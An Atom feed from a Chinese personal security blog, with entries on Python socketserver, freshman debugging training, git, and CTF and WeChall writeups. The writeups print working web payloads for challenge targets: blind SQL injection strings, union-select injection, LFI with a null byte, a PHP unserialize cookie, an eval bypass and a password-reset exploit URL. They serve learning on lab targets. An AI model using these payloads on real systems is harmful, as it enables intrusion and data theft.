<h3 id="StreamRequestHandler(BaseRequestHandler)">StreamRequestHandler(BaseRequestHandler)</h3><p>还是没有 <em>_init</em>_ 接着看下去</p>
<h4 id="setup(self)">setup(self)</h4><p>socket.accept() 返回的socket对象有个makefile方法，就是把收到的数据当成文件来读，返回的数据当文件来写，<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self<span class="class">.rfile</span> = self<span class="class">.connection</span><span class="class">.makefile</span>(<span class="string">'rb'</span>, self.rbufsize)</span><br><span class="line">self<span class="class">.wfile</span> = self<span class="class">.connection</span><span class="class">.makefile</span>(<span class="string">'wb'</span>, self.wbufsize)</span><br></pre></td></tr></table></figure></p>
<h4 id="finish(self)">finish(self)</h4><p>把上面打开的读写文件都关闭</p>
<h4 id="BaseRequestHandler">BaseRequestHandler</h4><p>接收三个值，初始化给self， 然后执行<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">handle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">finish</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p>
<p>这三个方法.</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>已经好久没更新过博客了，因为最近开始用为知笔记了，感觉每次发到blog的都太零散了，好多都还没完成，所以现在决定，零散的写到笔记里去，然后有一个完整的内容再发到blog里来。</p>
</blockquote>]]>
    
    </summary>
    
      <category term="Python" scheme="http://0x48.pw/tags/Python/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[10.31新生培训]]></title>
    <link href="http://0x48.pw/2015/10/31/0x0B/"/>
    <id>http://0x48.pw/2015/10/31/0x0B/</id>
    <published>2015-10-31T13:28:26.000Z</published>
    <updated>2016-03-28T10:21:57.638Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>10.31新生培训</p>
</blockquote>
<a id="more"></a>
<h2 id="代码的调试之旅_——_Debug">代码的调试之旅 —— Debug</h2><ol>
<li>VS2015<ul>
<li>F10 step out</li>
<li>F11 step into</li>
</ul>
</li>
<li>codeblocks<ul>
<li>shitf F7 step into</li>
<li>F7 step</li>
</ul>
</li>
<li>gdb<ul>
<li>next 执行下一行语句</li>
<li>step 同上，有函数则会进入函数</li>
<li>run 运行到断点处</li>
<li>breakpoint 下断点</li>
<li>start 停在main的第一行语句前</li>
<li>print 打印变量</li>
<li>display 跟踪一个变量</li>
<li>undisplay 取消跟踪</li>
<li>info locals 查看局部变量</li>
<li>list 列出最近十行代码</li>
</ul>
</li>
</ol>
<h2 id="BUG">BUG</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// error1.c</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span>&lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">index</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Hello World!"</span>)；</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//error2.c</span></span><br><span class="line"><span class="preprocessor">#include&lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a;</span><br><span class="line">	<span class="keyword">char</span> b[<span class="number">2</span>] = <span class="string">'ab'</span>;</span><br><span class="line"></span><br><span class="line">	a = <span class="string">"c"</span>;</span><br><span class="line"></span><br><span class="line">	printf(<span class="string">"b = %s and a = %c\n"</span>, b, a);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//error_last.c</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> yue</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> num;</span><br><span class="line">	<span class="keyword">struct</span> yue *next;</span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> yue *creat(<span class="keyword">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">struct</span> yue *head, *pold, *p;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	p = head = pold;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">1</span>; i&lt;a; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		p = (<span class="keyword">struct</span> yue *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> yue));</span><br><span class="line">		p-&gt;num = i;</span><br><span class="line">		pold-&gt;next = p;</span><br><span class="line">		pold = p;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	p-&gt;num = a;</span><br><span class="line">	p-&gt;next = head;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">struct</span> yue *p1, <span class="keyword">int</span> b)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	node *p;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">	p = p1;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (n = <span class="number">1</span>; n&lt; b - <span class="number">1</span>; n++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%5d"</span>, p-&gt;num);</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	node *p2;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"input x:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line"></span><br><span class="line">	p2 = creat(x);</span><br><span class="line">	print(p2, x);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="知识积淀_——_博客_OR_笔记">知识积淀 —— 博客 OR 笔记</h2><h3 id="For_yourself">For yourself</h3><pre><code>-<span class="ruby"> 作为知识的积淀，记录了你的成长
</span>-<span class="ruby"> 你确定你真的掌握了吗？如果你能把该知识点用文字描述出来，那么你就算是真的掌握了
</span>-<span class="ruby"> 备忘</span>
</code></pre><h3 id="For_others">For others</h3><pre><code>-<span class="ruby"> 知识分享
</span>-<span class="ruby"> 交友
</span>-<span class="ruby"> 面试时加分</span>
</code></pre><h3 id="How_can_I_write?">How can I write?</h3><pre><code>就想写日记一样， 多写，多看就知道怎么写了
</code></pre><h3 id="第三方博客">第三方博客</h3><pre><code>-<span class="ruby"> <span class="symbol">http:</span>/<span class="regexp">/www.diandian.com/</span>
</span>-<span class="ruby"> <span class="symbol">http:</span>/<span class="regexp">/blog.csdn.net/</span>
</span>-<span class="ruby"> 百度、新浪 等等</span>
</code></pre><p><em>PS: 可以从我博客的友情链接中发现协会其他人的博客</em></p>
<h2 id="推荐文章">推荐文章</h2><ol>
<li>前言: <a href="http://zhuanlan.zhihu.com/Evi1m0/19695848" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19695848</a></li>
<li>因为所以 <a href="http://zhuanlan.zhihu.com/Evi1m0/19700177" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19700177</a></li>
<li>黑客眼中的黑客 <a href="http://zhuanlan.zhihu.com/Evi1m0/19702939" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19702939</a></li>
<li>学会使用搜索引擎 <a href="http://zhuanlan.zhihu.com/Evi1m0/19714051" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19714051</a></li>
<li>首先，你需要先学会编程 <a href="http://zhuanlan.zhihu.com/Evi1m0/19733294" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19733294</a></li>
<li>你们眼中的黑客 —— 脚本小子 <a href="http://zhuanlan.zhihu.com/Evi1m0/19773598" target="_blank" rel="external">http://zhuanlan.zhihu.com/Evi1m0/19773598</a></li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>10.31新生培训</p>
</blockquote>]]>
    
    </summary>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[不使用select情况下的各种盲注]]></title>
    <link href="http://0x48.pw/2015/10/05/0x09/"/>
    <id>http://0x48.pw/2015/10/05/0x09/</id>
    <published>2015-10-05T03:17:10.000Z</published>
    <updated>2016-03-28T10:22:39.150Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>这次的XDCTF, 关于web1 400, 学到了很多666的姿势, 开一篇新博文, 记录这些姿势..</p>
</blockquote>
<a id="more"></a>
<p>原本我以为, 在select被过滤的情况下, 如果不能bypass, 就没法注入… 而这次看了writeup后, 不同的队, 姿势都不同, 大开眼界….</p>
<p>这次题目的语句我猜测是 <code>select pic from table where ID=&quot;$i&quot;;</code><br>$i 则是可控点..</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload 0x0:</span><br><span class="line">    $i = 1" &amp;&amp; username="%</span><br><span class="line">构成以下语句:</span><br><span class="line"><span class="operator"><span class="keyword">select</span> pic <span class="keyword">from</span> talbe <span class="keyword">where</span> ID=<span class="string">"1"</span> &amp;&amp; username=<span class="string">"%"</span></span><br><span class="line">这个payload可以用来猜测是否有该字段, 接下来的盲注这语句仍然可用</span><br><span class="line"></span><br><span class="line">payload <span class="number">0x1</span>:</span><br><span class="line">    $i = <span class="number">111</span><span class="string">" OR if(rpad(username,1,1)="</span>a<span class="string">",1,0)#  或者 111"</span> <span class="keyword">OR</span> <span class="keyword">if</span>(<span class="keyword">rpad</span>(username,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">char</span>(<span class="number">101</span>),<span class="number">1</span>,<span class="number">0</span>)# </span><br><span class="line">构成以下语句:</span><br><span class="line"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID=<span class="string">"111"</span> <span class="keyword">OR</span> <span class="keyword">if</span>(<span class="keyword">rpad</span>(username,<span class="number">1</span>,<span class="number">1</span>)=<span class="string">"a"</span>,<span class="number">1</span>,<span class="number">0</span>)#<span class="string">"</span><br><span class="line">在知道该表有username字段后, 可以通过这语句进行盲注</span></span></span><br></pre></td></tr></table></figure>
<p>上面的语句用到了两个函数, 一个 <code>if()</code> &amp;&amp; <code>rpad()</code><br>if函数在我之前的博客中写过, 就不再多说..主要讲讲rpad()<br>rpad还有个相同功能的行数lpad, 一个是right 一个是 left , 具体的用法已实例来讲解:<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">mysql&gt; select name from table;</span><br><span class="line">+----------+</span></span><br><span class="line"><span class="header">| name     |</span><br><span class="line">+----------+</span></span><br><span class="line"><span class="header">| Hcamael  |</span><br><span class="line">+----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"><span class="header">mysql&gt; select rpad(name,5,1) from table;</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| rpad(name,5,1)     |</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| Hcama              |</span><br><span class="line">+--------------------+</span></span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"><span class="header">mysql&gt; select rpad(name,10,1) from table;</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| rpad(name,10,1)     |</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| Hcamael111          |</span><br><span class="line">+---------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"><span class="header">mysql&gt; select lpad(name,5,1) from table;</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| rpad(name,5,1)     |</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| Hcama              |</span><br><span class="line">+--------------------+</span></span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"><span class="header">mysql&gt; select lpad(name,10,1) from table;</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| lpad(name,10,1)     |</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| 111Hcamael          |</span><br><span class="line">+---------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p>这两个函数有三个参数, 第一个是字段名, 第二个是显示几位, 第三个是当位数不足时, 以啥补充..</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload 0x2:</span><br><span class="line">    $i = 111" OR username REGEXP "^[a-z]</span><br><span class="line"><span class="operator"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID =<span class="string">"111"</span> <span class="keyword">OR</span> username <span class="keyword">REGEXP</span> <span class="string">"^[a-z]"</span></span><br><span class="line">正则匹配法注入, 真是涨姿势了, 第一次见</span><br><span class="line"></span><br><span class="line">payload <span class="number">0x3</span>:</span><br><span class="line">    $i = <span class="number">111</span><span class="string">" OR (ascii(ord(username,1,1)))=97# 或者 111"</span> <span class="keyword">OR</span> (<span class="keyword">ord</span>(username,<span class="number">1</span>,<span class="number">1</span>))=<span class="string">'a'</span>#</span><br><span class="line"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID=<span class="string">"111"</span> <span class="keyword">OR</span> (<span class="keyword">ascii</span>(<span class="keyword">ord</span>(username,<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">97</span>#<span class="string">"</span><br><span class="line">这种方法我以前盲注的时候写过, 可是当没有select的时候, 我却自然的以为这些不行用了...</span></span></span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>这次的XDCTF, 关于web1 400, 学到了很多666的姿势, 开一篇新博文, 记录这些姿势..</p>
</blockquote>]]>
    
    </summary>
    
      <category term="SQLi" scheme="http://0x48.pw/tags/SQLi/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[2015XDCTF低分web题writeup]]></title>
    <link href="http://0x48.pw/2015/10/03/0x08/"/>
    <id>http://0x48.pw/2015/10/03/0x08/</id>
    <published>2015-10-03T06:11:30.000Z</published>
    <updated>2016-03-28T10:23:12.270Z</updated>
    <content type="html"><![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-xdctf.png" alt="xdctf"></p>
<a id="more"></a>
<p>国庆两天, XDCTF, 质量和难度和上次的NSCTF都不是一个层次的…</p>
<h2 id="web1_100">web1 100</h2><p><code>index.php~</code> 搞出源码:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">'test'</span>];</span><br><span class="line"><span class="variable">$test</span>=md5(<span class="variable">$test</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">'0'</span>) &#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"flag&#123;xxxxxx&#125;"</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"you are falied!"</span>; </span><br><span class="line"><span class="keyword">print</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"tips:知道原理了，请不在当先服务器环境下测试，在本地测试好，在此测试poc即可，否则后果自负"</span>; </span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>这题黑魔法啊!!! 真是学习了<br><code>md5(&#39;240610708&#39;) = 0e462097431906509019562988736854</code><br>而 <code>&#39;0e462097431906509019562988736854&#39; == &#39;0&#39;</code></p>
<h2 id="web1_200">web1 200</h2><p>这题是大JAVA的题目,  可惜并不会,, 就是有个一个SessionExample界面, 可以进行设置session, (为啥需要这种东西?)<br>然后设置, login=true, user=Administrator</p>
<h2 id="web2_系列-">web2 系列..</h2><p>P神出的代码审计4连套, PS: P神写的站, 给你代码你也日不动~~<br>只搞定两题..</p>
<h3 id="web2_200">web2 200</h3><p>第一步是搞到源码, 题目里说了用git管理源码, 所以应该是.git 泄露了… 访问 /.git 403, 果然是….</p>
<p>去百度后下载了 <code>rip-git.pl</code> ,拖/.git, 拖下来了, 却不能还原源码, 估计有些重要的没拖下来..</p>
<p>接下来是:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git checkout master</span><br><span class="line"><span class="variable">$ </span>git checkout -f</span><br></pre></td></tr></table></figure></p>
<p>搞出来了个 <code>README.md</code><br>根据里面的提示, 去网站上搞到了个 /.git/refs/tags/1.0<br>然后把 /.git/refs/heads/master 的hash 值用 /tags/1.0 里的hash替换<br>再 <code>$ git checkout -f</code><br>然后就搞到源码了, 第一个200的flag就在index.php里..</p>
<h3 id="web2_100">web2 100</h3><p>存在强制修改任意用户密码漏洞, 管理员邮箱在首页: xdsec-cms@xdctf.com<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: </span><br><span class="line"><span class="link_url">http://xdsec-cms-12023458.xdctf.win/index.php/auth/resetpwd?email=xdsec-cms@xdctf.com&amp;verify</span>[<span class="link_label">1</span>]=aa</span><br></pre></td></tr></table></figure></p>
<p>修改密码后登录, get 100 flag…</p>
<p>后面就日不动了,,, 毕竟P神…<br>XDCTF的web题质量都挺高的…学到了很多..</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-xdctf.png" alt="xdctf"></p>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://0x48.pw/tags/CTF/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[WeChall Writeup]]></title>
    <link href="http://0x48.pw/2015/08/07/0x06/"/>
    <id>http://0x48.pw/2015/08/07/0x06/</id>
    <published>2015-08-07T09:01:53.000Z</published>
    <updated>2016-03-28T10:23:57.478Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>年轻人，要多撸题，多看书，少打游戏，少打炮..</p>
</blockquote>
<a id="more"></a>
<h2 id="0x00_No_Escape">0x00 No Escape</h2><p>看源码, 是sql注入.<br>payload: <code>index.php?vote_for=bill</code>=111%23`</p>
<h2 id="0x01_Training:_PHP_LFI">0x01 Training: PHP LFI</h2><p>看源码, 文件包含漏洞.<br>payload: <code>index.php?file=../../solution.php%00</code></p>
<h2 id="0x02_PHP_0817">0x02 PHP 0817</h2><p>这个比较傻..不多说.<br>payload: <code>index.php?which=solution</code></p>
<h2 id="0x03_Training:_Register_Globals">0x03 Training: Register Globals</h2><p>全局变量的问题,,上次看到过,,不过现在的php已经没这漏洞了…(PHP还是那么老版本的活该..)<br>payload: <code>globals.php?login[]=admin</code></p>
<h2 id="0x04_Are_you_serial">0x04 Are you serial</h2><p>这个有点屌…放代码吧..<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_autoloader</span><span class="params">(<span class="variable">$classname</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">'./'</span>.str_replace(<span class="string">'.'</span>, <span class="string">''</span>, <span class="variable">$classname</span>).<span class="string">'.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cece</span><span class="params">(<span class="variable">$name</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(<span class="string">'cece'</span>);</span><br><span class="line"> <span class="comment">#spl_autoload_register('my_autoloader');</span></span><br><span class="line"><span class="variable">$user</span> = unserialize(<span class="string">'O:7:"phpinfo":0:&#123;&#125;'</span>);</span><br></pre></td></tr></table></figure></p>
<p>这题的重点就在于 <code>spl_autoload_register</code> 这个函数.<br>解序列化后的如果有类, 而且当前程序中未定义该类, 则会自动把该类的名称传值到 (<code>sql_autoload_register(xxx)</code>) xxx函数中.<br>这题只要能运行 <code>SERIAL_Solution.php</code> 这个文件就算成功</p>
<p>所以最后的payload是改cookie,<br><code>serial_user</code> 的值为 <code>O:15:&quot;SERIAL_Solution&quot;:0:{}</code></p>
<h2 id="0x05_PHP_0819">0x05 PHP 0819</h2><p>第一次知道php还有这鬼东西….heredoc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;suibian</span><br><span class="line">正文</span><br><span class="line">正文</span><br><span class="line">suibian;</span></span><br><span class="line"><span class="comment">// 格式应该是 &lt;&lt;&lt;+任意字符x+换行+字符串+换行+任意字符x+;</span></span><br></pre></td></tr></table></figure>
<p>这题的目的 <code>eval(&quot;\$spaceone=&#39;1337&#39;;&quot;);</code><br>但是引号都被过滤了…所以就可以用上面的那个代替引号…这里由于<code>eval</code>的原因, 结尾还要再来一个换行<br>payload: <code>index.php?eval=&lt;&lt;&lt;r%0a1337%0ar;%0a</code></p>
<h2 id="0x06_HOST_me">0x06 HOST me</h2><p>这题一看就知道是去改host, 不过比较坑….改成 <code>host:localhost</code> 后会报错…纠结了好久..<br>网上查了以下才知道…需要….<br>payload:<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只把要修改的行列出来</span></span><br><span class="line">GET <span class="string">http:</span><span class="comment">//www.wechall.net/challenge/space/host_me/index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> localhost</span><br></pre></td></tr></table></figure></p>
<h2 id="0x07_PHP_0815">0x07 PHP 0815</h2><p>这题有点屌…这题的大概意思是它给你的代码存在sqli, 然后让你给出修补的方案, 要给出最短, 还不会影响原程序的方案…<br>表示并不会, 只看出了应该是修改 <code>in_array</code> 这里..<br>到网上搜索后才知道, 需要把 <code>$show</code> 转换为int 型, 有 <code>int()</code> 和 <code>intval()</code> 然而答案要最短,<br>最短的黑魔法…. —&gt; <code>$show - 0</code><br>提交 <code>in_array($show-0, $whitelist)</code> 竟然不对…坑爹的…最后提交 <code>-0</code> 过了..</p>
<p>最后, 我在想,, 这脚本有sqli? 怎么日? ….然后试了一下…果然有…<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code.php?show=1%20union%20select%201%23</span></span><br><span class="line">Query: SELECT <span class="number">1</span> FROM `table` WHERE `id`=<span class="number">1</span> union select <span class="number">1</span><span class="comment">#</span></span><br><span class="line">SHOWING NUMBER <span class="number">1</span> union select <span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<!--## 0x08 Stop us-->
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>年轻人，要多撸题，多看书，少打游戏，少打炮..</p>
</blockquote>]]>
    
    </summary>
    
      <category term="Wechall" scheme="http://0x48.pw/tags/Wechall/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[git小记]]></title>
    <link href="http://0x48.pw/2015/07/22/0x04/"/>
    <id>http://0x48.pw/2015/07/22/0x04/</id>
    <published>2015-07-22T12:30:25.000Z</published>
    <updated>2016-03-28T10:24:28.542Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>今天用git，把文件上传到服务器，然后下载下来，这些过了一遍。发现，在linux上git是最好用的。。。</p>
</blockquote>
<a id="more"></a>
<p>git不像svn一样分服务端客户端，git在linux只需要一句命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git</span><br></pre></td></tr></table></figure></p>
<p>之后，既可以做服务端，可以做客户端。</p>
<h1 id="服务端">服务端</h1><p>如果想使用git做服务端，第一步就是创建git用户</p>
